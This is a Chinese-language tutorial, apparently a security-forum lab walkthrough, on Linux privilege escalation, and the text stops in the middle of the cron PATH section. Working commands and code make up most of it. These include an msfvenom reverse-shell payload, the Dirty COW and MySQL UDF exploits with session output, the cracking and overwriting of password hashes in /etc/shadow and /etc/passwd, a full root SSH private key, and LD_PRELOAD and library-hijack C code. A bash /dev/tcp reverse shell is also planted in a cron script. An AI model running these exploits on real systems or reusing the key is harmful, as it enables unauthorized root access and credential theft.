0x01 一般概念
=========

我们在 Linux 中特权升级的最终目标是获得root用户

用户、组、文件、目录
----------

### 四者之间的关系

用户可以属于多个组。组可以具有多个用户。

每个文件和目录都根据用户、组和"其他用户"（所有其他用户）来定义其权限。

### 用户

用户帐户配置在/etc/passwd文件。

用户密码哈希存储在/etc/shadow文件中。

用户由整数用户 ID (UID)识别。

root用户帐户是 Linux 中的一种特殊类型的帐户。它的 **UID 为 0**，系统允许此用户访问每个文件。

### 组

组配置在/etc/group文件中。

用户有一个主要组，并且可以有multiple二级（或补充）组。

默认情况下，用户的主要组与用户帐户的名称相同。

### 文件和目录

所有文件和目录都有一个所有者和一个组。

权限以读取、编写和执行操作的方式定义。

有三组权限，一组为所有者，一组为组，一组为所有"其他"用户

**只有所有者才能更改权限**

权限
--

### 文件权限

• Read -设置后，可以读取文件内容。

• Write -设置后，文件 内容可以修改。

• Execute -设置后，文件可以执行 （即作为某种过程运行 ）。

### 目录权限

• Execute 设置时，目录可以输入。未经此许可，读取或写入权限均不起作用。

• Read -设置时，目录内容可以列出。

• Write -设置时，文件和子目录可以在目录中创建。

### 特殊权限

• setuid (SUID) bit

设置后，文件将使用文件所有者的权限执行。

• setgid (SGID) bit

设置在文件上时，文件将使用文件组的权限执行。

设置在目录上时，该目录内创建的文件将继承目录本身的组。

### 查看权限

ls命令可以查看权限

```php
ls -l /bin/date
```

![image-20210701131222816](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0eb1c71aed3209809d0ede7d6e16451021cf1bc7.png)

简单阐述一下： 前10个字符表示对文件设置的权限或目录。

第一个字符只是表示类型，例如，文件`d`的`-`用于目录

剩下的9个字符代表3组权限(所有者、组、其他)

每组包含3个字符，表示读(r)、写(r)，可执行(x)

SUID/SGID权限由中的`s`表示执行位置

真实、有效和保存的UID/GID
----------------

### 前言

用户是由用户ID标识的。

实际上，在Linux中，每个用户有3个用户id(real，effective，and saved)

用户的真实ID是他们的真实身份`/etc/passwd`中定义的ID

### 继续深入

用户的有效ID通常等于其真实ID，但是作为另一个用户执行一个进程时，有效ID被设置为该用户的真实身份。

在大多数访问控制决策中，有效ID用于验证用户，

`whoami`等命令使用有效ID。

最后，保存的ID用于确保`SUID`进程

临时将用户的有效ID切换回其真实ID并返回，在不丢失原始有效ID的情况下

### 实操

#### 真实有效的用户/组ID：

![image-20210701132736765](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cb8f8bf293f189189558027fbb4c1c335fa75235.png)

#### 当前进程（即我们的shell）

真实、有效、已保存和文件系统用户/组ID

```php
cat /proc/$$/status | grep "[UG]id"
```

![image-20210701132748704](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-160f1d7c03e052cab42d305fc4bd9ccae6a45c14.png)

0x02 生成外壳
=========

前言
--

目标：生成root外壳执行`/bin/sh` 或`/bin/bash`

rootbash SUID
-------------

创建一个副本

在/bin/bash可执行文件中创建一个副本 ，通常将其重命名为rootbash，确保它归根用户所有

并且设置了SUID位，只需执行rootbash文件就可以生成root的shell

使用`-p`命令行选项，可以持久，方便我们多次利用rootbash

自定义可执行文件
--------

可能存在某些根进程执行另一个root进程，你可以控制的过程。

这时候

```c
int main() {
setuid(0);
system("/bin/bash -p");
}
```

上一串神秘的`.c`代码

```php
gcc -o <name> <filename.c
```

编译后，将生成一个以root身份运行的Bash shell：

msfvenom
--------

反向外壳 首先msfvenom，又叫毒液

```php
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > a001.elf
```

接收shell的话 可以使用：nc或者msf中的监听(multi/handler)

本地反向外壳
------

使用一个工具是

<https://github.com/mthbernardes/rsg>

接收shell的话 可以使用：nc

0x03 工具
=======

Linux Smart Enumeration
-----------------------

优点：靶机环境没有安装Python

`lse.sh`是一个 Bash 脚本，它有多个级别， 一步一步的扩展信息

<https://github.com/diego-treitos/linux-smart-enumeration>

LinEnum
-------

LinEnum 是一个高级 Bash 脚本，它从目标系统中提取了大量有用的信息。  
它可以复制文件并进行导出，同时可以搜索包含关键字的文件。  
<https://github.com/rebootuser/LinEnum>

其他工具
----

<https://github.com/linted/linuxprivchecker>  
<https://github.com/AlessandroZ/BeRoot>  
<http://pentestmonkey.net/tools/audit/unix-privesc-check>

0x04 内核漏洞
=========

前言
--

内核是任何操作系统的核心。  
将其视为应用程序软件和实际计算机硬件之间的一层

但是这边注意：**没有在必要的情况下，不建议使用，因为会把目标机器搞的宕机**

查找内核漏洞
------

- 1.查看内核版本(uname-a)
- 2.查找与之相匹配的漏洞（Google, ExploitDB, GitHub）。
- 3.编译并运行。

实操
--

### 查看内核版本

![image-20210630111311891](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b26ff0b8801663adabfd20d1a38e339ae28c25e9.png)

### 漏洞寻找

```php
searchsploit Linux debian 2.6.32
```

![image-20210630112011959](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5261409b801e7e946bd754c2eb10e9dda5cb0f56.png)

### 安装漏洞建议器

<https://github.com/jondonas/linux-exploit-suggester-2>

查看参数

```php
[-h]帮助

[-k]内核号

[-d]打开漏洞利用下载菜单 
```

![image-20210630112353863](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6dacb5bfb0add1de5684a45a4a079758050ee1c3.png)

```php
 ./linux-exploit-suggester-2.pl -k 2.6.32
```

![image-20210630112537357](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-afc6125e38ba36a122cf8ee70f9e5f3135027e03.png)

可以看到有许多的Dirty COW的漏洞利用

### CVE-2016-5195

这里参考：<https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54>

进行编译

```php
gcc -pthread c0w.c -o c0w
```

![image-20210630120211277](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-54f1182aac67e5e30d9acb452b8fe36ef1402af4.png)

### 漏洞利用

python开始HTTP服务 机器通过wget下载`c0w.c`

![image-20210630113819038](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5b9935b9d3356987a5efa06a89481485d3742ffc.png)

进行编译执行

![image-20210630120237500](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b3ba83af3afc1b349a1859fe187fded49bb92794.png)

### 通过二进制文件

```php
/usr/bin/passwd
```

### 成功拿到root权限

![image-20210630120353418](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ad65ebb87f6319fa771b3c1a28a8aa9ab2ad0f73.png)

0x05 服务漏洞
=========

前言
--

服务只是在后台运行、接受输入或执行常规任务的程序。  
如果弱势服务以root权限运行，则利用它们可导致命令执行  
使用 Searchsploit、谷歌和 GitHub 可以找到服务漏洞，就像使用内核漏洞一样。

查找以root权限运行的服务
--------------

```php
ps aux | grep "^root"
```

列举程序版本
------

使用 命令行选项运行程序通常显示版本编号：

```php
<program> --version
<program> -v
```

类似 Debian 的系统上，dpkg 可以显示已安装的程序及其版本：

```php
dpkg -l | grep <program>
```

在使用rpm的系统上

```php
rpm –qa | grep <program>
```

实操
--

### 查看以root权限运行的服务

![image-20210630114911170](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-77264c973fb0be4d7a5c8018ddfe3562fa960cc4.png)

看到mysql数据库 在以root权限运行

### 查看Mysqld的版本号

![image-20210630115710381](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c3ddabef01c149746af253335d38f02c12e5e48f.png)

Mysql数据库可以用过UDF提权进行实现

### Mysql-UDF提权

<https://www.exploit-db.com/exploits/1518>

安装通过共享对象运行的用户定义功能 进行提权

下载源码到靶机

![image-20210630130745288](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-863980c3f26a14efce66086cfd7ab0a544b0b685.png)

用法要进行一些修改

这里要提一下

gcc编译中的选项

```php
加上 fPIC 选项生成的动态库，显然是位置无关的，这样的代码本身就能被放到线性地址空间的任意位置，无需修改就能正确执行
可以理解为放宽了编译通过的维度
```

```php
user@debian:~$ gcc -g -c raptor_udf2.c -fPIC
user@debian:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
user@debian:~$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 35
Server version: 5.1.73-1+deb6u1 (Debian)

Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)

mysql> insert into foo values(load_file('/home/user/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select do_system('cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash');
+----------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash') |
+----------------------------------------------------------------+
|                                                              0 |
+----------------------------------------------------------------+
1 row in set (0.01 sec)

mysql> exit
Bye
user@debian:~$ /tmp/rootbash -p
rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

![image-20210630133158537](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7de5351bc98f3003061b1962d73ca70721d24bdc.png)

看看目标机器正在监听的端口

![image-20210630134221883](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-db11533503efbc4ba614f359cd3bf25f13b21316.png)

但是它绑定到 本地主机地址：127.0.0.1 所以我们不能从外部访问它

### 端口转发

某些情况下，root过程可能受约束于内部端口  
如果由于某种原因，漏洞攻击不能在目标机器上本地运行，则端口可以使用SSH转发到本地机器：

```php
ssh -R <kali本地端口>:127.0.0.1:< 目标端口 ><苏塞纳梅>@<kali本地IP>
ssh -R 5555:127.0.0.1:3306 root@192.168.175.130
```

0x06.脆弱的文件权限
============

前言
--

如果某些系统文件的权限太弱，则可以利用某些系统文件执行权限升级。  
如果系统文件有我们可以读取的机密信息，则可用于访问root  
如果可以写入系统文件，我们就可以修改，操作系统的工作方式并以这种方式获得root权限

相关的命令
-----

在`/etc:`中查找所有可写文件：

```php
find /etc -maxdepth 1 -writable -type f
```

在`/etc:`中查找所有可读文件：

```php
find /etc -maxdepth 1 -readable -type f
```

查找可写入的所有目录：

```php
find / -executable -writable -type d 2> /dev/null
```

针对/etc/shadow 文件
----------------

`/etc/shadow`文件包含用户密码哈希值，默认情况下，除root用户外，任何用户都无法读取。

- 思路一：  
    如果我们能够读取 /etc/shadow 文件的内容，我们也许能够破解根用户的密码哈希。
- 思路二：  
    如果我们能够修改/etc/shadow文件，我们可以用我们所知道的密码哈希替换root用户的密码哈希

### 实操一、

#### 1.检查权限 /etc/shadow 文件

```php
ls -l /etc/shadow 
```

![image-20210630140751442](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b5156bd26be5999ed9359824e57161acc9792b58.png)

#### 2.提取root用户的密码哈希

```php
head -n 1 /etc/shadow
```

![image-20210630140948488](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c11309c1de294878fdba5d438b7038fe5f75b2aa.png)

```php
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
```

#### 3.将密码哈希保存在文件中

```php
echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > 'hash.txt'
```

![image-20210630141431879](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0f98570457a031ecaa2e5624ac3d6df8db9ef9fe.png)

#### 4.使用开膛手破解密码哈希

```php
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![image-20210630141447898](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-29948fb5eab617c9616cefb0e9d3efafa392b7b9.png)

#### 5.使用su 命令切换到root用户

```php
su
```

![image-20210630141653620](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4ecf12356b2c8b3bcb3558dc568e660350133940.png)

### 实操二、

#### 1.检查权限/etc/shadow 文件：

```php
ls -l /etc/shadow 
```

#### 2.复制保存/etc/shadow 的内容，以便我们以后可以恢复

```php
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```

![image-20210630142720204](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d364009c93608ef50a9a840f2a80b1efd2cb5b0c.png)

#### 3.生成 新的 SHA-512 密码 哈希：

```php
mkpasswd -m sha-512 password    
$6$WLjW9I7t4e7hhgDy$5smTCs43aPOZCR3KrG.BGuyzDyjsegc3ix3lRSZfX.O26gKGsznN6x9rs6jtxh5//qEZNS2IOUCvgbUQrAU04.
```

root用户的密码：password

#### 4.编辑/etc/shadow，并将根用户的密码哈希替换为我们生成的密码。

![image-20210630144055411](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b625fa159e07bed1a332999f933676a9923446e6.png)

![image-20210630144137065](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5e899ce8d59ddaeac8d88edec399f045bc414a25.png)

#### 5.使用su 命令切换到根用户

![image-20210630144159777](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a59295e68fc6c13a55e2df4013281cd5b0a9ca78.png)

针对/etc/passwd文件
---------------

### 前言

`/etc/passwd`历史上包含用户密码哈希。

**为了向后兼容，如果/etc/passwd中用户行的第二个字段包含密码哈希，它优先于/etc/shadow中的哈希**

如果我们可以写入`/etc/passwd`，我们就可以很容易地输入一个已知的密码散列 root用户，然后使用su命令切换到根用户。

或者，如果我们只能附加到文件，我们可以创建一个新的用户，为他们分配根用户ID(0)。

这是因为Linux允许多个条目，对于相同的用户名，只要用户名不同

/etc/passwd的root帐户配置的：

```php
root:x:0:0:root:/root:/bin/bash #通常
```

第二个字段中的`x`指示 Linux 查找 /etc/shadow文件中的密码哈希。

在Linux的某些版本中，可以简单地删除`x`，Linux 将其解释为用户没有密码：

```php
root::0:0:root:/root:/bin/bash
```

### 实操

#### 检查/etc/passwd文件的权限：

```php
ls -l /etc/passwd 
```

![image-20210630145719525](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1d17ffaacac1782359e1b8868a61f04067038589.png)

#### 2.使用openssl生成密码哈希：

```php
openssl passwd "qwer" 
```

![image-20210630145846124](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-90136757924d867769f3af88787eddaf5caf063d.png)

#### 3.编辑 `/etc/passwd`文件

输入root用户行第二个字段中的哈希：

```php
ZSL11eCDBkMnk
```

![image-20210630145957018](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-499c28460b26da220b1efe707e59deb849a0f5d3.png)

![image-20210630150036456](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ab9cb2773a5ba1144695f074c1713f23b773b586.png)

保存 退出

#### 4.使用su命令切换到根用户

```php
su
```

![image-20210630150207862](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0762789be80df92fd273a1f9180af5684adc362f.png)

因为优先级问题 所以机器root账户的密码是：qwer

#### or

#### 1.创建备用根用户

```php
qwer:ZSL11eCDBkMnk:0:0:root:/root:/bin/bash
```

![image-20210630150549882](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-59f1a8d217b5f3ca49aa2d1d830b73437779c13e.png)

#### 2.使用su命令切换到新根用户：

```php
su
```

![image-20210630150624343](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-df46da614cf4dca7022c13a06e330af4d6913cb4.png)

备份
--

### 前言

即使计算机在重要或敏感文件上拥有正确的权限，用户也可能已创建这些文件的不安全备份。  
它总是值得探索的文件系统寻找可读的备份文件。

一些常见的地方包括 / (root) directory, /tmp, and /var/backups

### 实操

### 1.在常见位置查找文件，尤其是一些隐藏文件

```php
ls -la /home/user 
ls -la / 
ls -la /tmp 
ls -la /var/backups
```

![image-20210630151315783](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-eb7079a3ffca36827da6f3c6cca4f8db02ec8487.png)

![image-20210630151343205](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a9320909020dad1c69caf8dc89861f9e84d043fa.png)

![image-20210630151358879](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3efc3d198481eb80748a0feda2ffe82d63236144.png)

![image-20210630151410318](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6ad95fd6bccbcbfe923c28873f131c96d97deed0.png)

### 2.root目录下存在隐藏的`.ssh`目录：

```php
drwxr-xr-x 2 root root 4096 Aug 24 18:57 .ssh
```

### 3.翻看`.ssh`目录

![image-20210630151814494](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-634ebc24780261f972e709f82eaee9daed15da98.png)

一个可读的文件`root_key`

### 4.进一步检查root\_key文件

```php
head -n 1 /.ssh/root_key 
```

![image-20210630151929543](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5dbe0c506ff27209875241d401be853aecb3160d.png)

这是一个 SSH 私钥。文件的名称和所有者告诉我们密钥属于root用户：

### 注意

在我们尝试使用此密钥之前，让我们确认甚至允许通过 SSH 登录根：

```php
grep PermitRootLogin /etc/ssh/sshd_config 
```

![image-20210630152045099](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-557ea2cb02b10ca97f97e1b0168f47d6b1462416.png)

### 5.将密钥复制到本地机器，并给予其正确的权限

![image-20210630152738111](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2f298594c9165631ab6b34f20ec148cd771be46e.png)

```php
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm
gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl
p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo
OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD
eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET
Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2
NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ
YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+
5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el
WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7
VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7
6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW
1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K
824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6
Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc
U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1
Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi
SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV
d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im
jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa
871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok
X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4
CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN
Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4
LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==
-----END RSA PRIVATE KEY-----
```

```php
chmod 600 root_key 赋予权限
```

### 6.使用将SSH的密钥登录root帐户：

```php
ssh -i root_key root@192.168.175.228
```

![image-20210704102546394](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-434fc573216398a4fcc1c6d57d500cb463d82038.png)

0x07 SUDO
=========

前言
--

sudo 是一个程序，允许用户运行具有其他用户安全特权的其他程序。

默认情况下，该其他用户将是root用户  
用户通常需要输入密码才能使用sudo，并且必须允许用户通过`/etc/sudoersfile`文件中的规则访问。  
规则可用于将用户限制在某些程序中，并放弃密码输入要求。

相关的命令
-----

使用sudo运行程序：

```php
sudo <program>
```

以特定用户的身份运行程序：

```php
sudo –u <username> <program>    
```

允许（且不允许）运行列出用户的程序：

```php
sudo -l
```

到目前为止，用sudo最明显的特权升级是使用sudo，因为它是预期的！

通过使用交换用户`su`命令生成root

```php
sudo su
```

其他方法  
有些时候不允许执行 su 计划，则有许多其他方法可以升级特权：

```php
sudo -s 
sudo -i 
sudo /bin/bash 
sudo passwd
```

即使没有"明显"的方法来升级特权，我们也可以使用外壳逃生序列。

外壳逃生序列
------

即使我们仅限于通过sudo运行某些程序，有时也有可能"逃避"程序并生成壳。  
由于初始程序具有root权限运行，因此生成的外壳也是如此。  
此处可以找到带有外壳逃生序列的程序列表：<https://gtfobins.github.io>

步骤
--

### 1.列出允许用户运行的程序

```php
sudo -l
```

![image-20210630162439011](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f64fb160ff2a439cdd5f2ea47e0b1d42a27a3c9b.png)

### 2.对每个程序进行查表，要细心

<https://gtfobins.github.io/>

### 3.如果存在逃生序列，则通过sudo 运行程序并执行序列以生成根壳。

滥用预期功能
------

如果程序没有逃生序列，则仍可能使用它来升级权限。  
如果我们能够读取root用户拥有的文件，我们也许能够提取有用的信息（例如密码、哈希斯、密钥）。  
如果我们 可以写信给root拥有的文件，我们也许能够插入或修改信息。

### 实操

#### 1.允许用户通过Sudo运行的程序：

```php
sudo -l
```

![image-20210630162439011](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f64fb160ff2a439cdd5f2ea47e0b1d42a27a3c9b.png)

#### 2.apache2

已知中：apache2没有任何已知的外壳逃逸

但是，在解析给定的配置文件时，会出错并打印任何它不理解的行

#### 3.使用sudo运行apache2，并提供/etc/shadow文件作为配置文件

```php
sudo apache2 -f /etc/shadow 
```

![image-20210630163336520](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b5e077aedc6a43b215db5c5d97fc0f46c502f97e.png)

#### 4.从文件中提取根用户的哈希。

#### 5.将密码哈希保存在文件中：

```php
echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt
```

![image-20210630163503549](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a26500c19619900b66fea49053a6bef5d8ad5619.png)

#### 6.使用开膛手破解密码哈希：

```php
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![image-20210630141447898](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-29948fb5eab617c9616cefb0e9d3efafa392b7b9.png)

#### 7.使用su 命令切换到root用户

```php
su
```

![image-20210630164008714](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f9a30d39bdd4badc1b13322a929593a31eda50e8.png)

### 环境变量

通过sudo运行的程序可以从用户的环境中继承环境变量。  
在`/etc/sudoers`配置文件中，

如果设置`env_reset`选项，sudo 将在新的、最小的环境中运行程序。  
`env_keep`选项可用于防止某些环境变量远离用户的环境。  
`sudo -l`时显示配置的选项

#### LD\_PRELOAD

##### 前言

LD\_PRELOAD预加载 是一个环境变量，可以设置为共享对象 (.so)文件的路径。  
设置时，共享对象将先于任何其他对象加载。  
通过创建自定义共享对象并创建 init()功能，我们可以在加载 object 后立即执行代码。

##### 局限性

如果真正的用户 ID与有效的用户 ID不同，则LD\_PRELOAD将不起作用。  
必须配置 sudo，以便使用`env_keep`选项来维护LD\_PRELOAD环境变量。

##### 实操

##### 1.列出允许用户运行的程序

```php
sudo -l
```

![image-20210704102838002](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-05bb8446e5ed57c439784e3b62b93dc4482d3d54.png)

注意：`env_keep`包括`LD_PRELOAD`环境变量

##### 2.创建具有以下内容的文件(preload.c)：

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

![image-20210704103218382](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5b483c763ff660ee75bfa48239b501490410acb9.png)

##### 3.编译preload.c到preload.so：

```php
 gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

##### 4.使用sudo运行任何允许的程序，同时将LD\_PRELOAD环境变量设置为preload.so文件的完整路径：

```php
sudo LD_PRELOAD=/tmp/preload.so apache2
```

![image-20210704103256577](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-93cddd194729bb8076a0ac1af2a01da9d3132662.png)

#### LD\_LIBRARY\_PATH

#### 前言

LD\_LIBRARY\_PATH环境变量包含一组目录，首先搜索共享库。  
ldd 命令可用于打印程序使用的共享库：

```php
ldd /usr/sbin/apache2
```

通过创建与程序使用的同名共享库，并将LD\_LIBRARY\_PATH设置为其父目录，程序将转而加载我们的共享库。

#### 实操

##### 1.运行ldd对apache2程序文件：

```php
ldd /usr/sbin/apache2
```

![image-20210704103440965](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-75b828ae8f3a504b1f0fa83b9540ed79c1d22c3a.png)

这个方法是进行劫持共享对象是命中或未命中的，从中选择一个列表并尝试它

##### 2.创建具有以下内容的文件(library\_path.c)：

```c
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

![image-20210704103702129](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8b73148569fdf924e87844546b1b4ca4c1175c8c.png)

##### 3.将library\_path.c 编译成libcrypt.so.1:

```php
gcc -o libcrypt.so.1 -shared -fPIC library_path.c
```

##### 4.使用 sudo运行 apache2，同时将LD\_LIBRARY\_PATH环境变量设置为当前路径（我们汇编library\_path.c）：

```php
sudo LD_LIBRARY_PATH=. apache2
```

![image-20210704103723147](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-09ce44ce38791c1e387866d649c7cb1e8b1554ee.png)

0x08 Cron jobs
==============

前言
--

Cron jobs是用户可以安排在特定时间或间隔运行的程序或脚本。  
Cron jobs与拥有它们的用户的安全级别一起运行。  
默认情况下，使用环境变量有限的`/bin/sh` shell

Cron tables
-----------

Cron tables存储了Cron jobs的配置  
User Crontabs通常位于`/var/spool/cron/` or `/var/spool/cron/crontabs/`  
system系统的crontab位于`/etc/crontab`

文件权限
----

与 Cron jobs关联的文件权限配置错误可能导致提权  
如果我们可以编写到作为 cron jobs的一部分运行的程序或脚本，我们可以用我们自己的代码替换它。

实操
--

### 1.查看system-wide crontab的内容：

```cat
cat /etc/crontab
```

![image-20210630171256823](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7e11c9996ab80702455329960fc96baa6bca417a.png)

### 2.在服务器上查找overwrite.sh 文件：

```php
locate overwrite.sh 
```

![image-20210630171347594](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2da119d448f2523bcae0f85c4296ded2758c7fc3.png)

```php
/usr/local/bin/overwrite.sh
```

### 3.检查文件的权限

```php
ls -l /usr/local/bin/overwrite.sh
```

![image-20210630171515478](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dcf9670c88ba8a2f27257902f74239101814561f.png)

注意：这个文件是可写的

### 4.将 overwrite.sh文件的内容替换为：

```php
#!/bin/bash 
bash -i >& /dev/tcp/192.168.175.130/4444 0>&1
```

![image-20210630171650623](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4bc93b1eb40a22eca847643fad322f1373f77a5a.png)

### 5.kali上运行nc

等待 cron jobs运行，返回root权限

路径环境变量
------

默认情况下，crontab环境变量设置为：`/usr/bin:/bin`  
路径变量可以覆盖在crontab文件中。  
如果 cron jobs程序/脚本不使用绝对路径，并且其中一个 PATH 目录可由我们的用户编写，我们也许能够创建与 cron jobs同名的程序/脚本。

实操
--

### 1.查看system-wide crontab的内容：

```php
cat /etc/crontab
```

![image-20210630173619529](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f1f7936e2b1920ff0715fb6766f3c4ee1c9db3f1.png)

请注意，/home/user目录（我们可以写信给）位于 PATH 变量的开头，并且第一个 cron jobs不使用绝对路径。

### 2.在/home/user 中创建文件 overwrite.sh，内容如下：

```php
